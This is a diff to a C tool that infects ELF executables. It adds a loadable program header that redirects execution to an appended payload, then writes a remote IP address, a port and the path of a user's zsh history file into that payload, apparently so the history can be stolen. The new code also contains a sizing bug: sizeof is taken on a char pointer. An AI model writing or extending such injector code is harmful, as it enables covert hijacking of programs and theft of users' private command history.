@@ -11,14 +11,14 @@
 
 typedef struct {
     uint32_t p_type;
-    uint32_t p_offset;
-    uint32_t p_vaddr;
-    uint32_t p_paddr;
-    uint32_t p_filesz;
-    uint32_t p_memsz;
     uint32_t p_flags;
-    uint32_t p_align;
-} Elf32_Phdr;
+    uint64_t p_offset;
+    uint64_t p_vaddr;
+    uint64_t p_paddr;
+    uint64_t p_filesz;
+    uint64_t p_memsz;
+    uint64_t p_align;
+} Elf64_Phdr;
 
 
 #ifdef __APPLE__
@@ -113,7 +113,7 @@ int main(int argc, char *argv[], char *envp[]) {
     }
 
     // Write the new program header for the payload
-    Elf32_Phdr new_phdr = {
+	Elf64_Phdr new_phdr = {
         .p_type = PT_LOAD,
         .p_offset = size,
         .p_vaddr = new_entry_point,
@@ -125,7 +125,7 @@ int main(int argc, char *argv[], char *envp[]) {
     };
 
     // Append the new program header
-    if (pwrite(fd, &new_phdr, sizeof(new_phdr), ehdr.e_phoff + ehdr.e_phnum * sizeof(Elf32_Phdr)) != sizeof(new_phdr)) {
+	if (pwrite(fd, &new_phdr, sizeof(new_phdr), ehdr.e_phoff + ehdr.e_phnum * sizeof(Elf64_Phdr)) != sizeof(new_phdr)) {
         perror("pwrite");
         close(fd);
         return 1;
@@ -138,6 +138,14 @@ int main(int argc, char *argv[], char *envp[]) {
         close(fd);
         return 1;
     }
+
+	char *filepath = "/home/maxence/.zsh_history";
+	// Write the port and address IP to the end of the payload
+	if (pwrite(fd, filepath, sizeof(filepath), size + payload_size_p - 4 - 2 - 1024) != sizeof(filepath)) {
+		perror("pwrite");
+		close(fd);
+		return 1;
+	}
 
     // Add the port and address IP to the payload
     if (pwrite(fd, &port, sizeof(port), size + payload_size_p - 4 - 2) != sizeof(port)) {
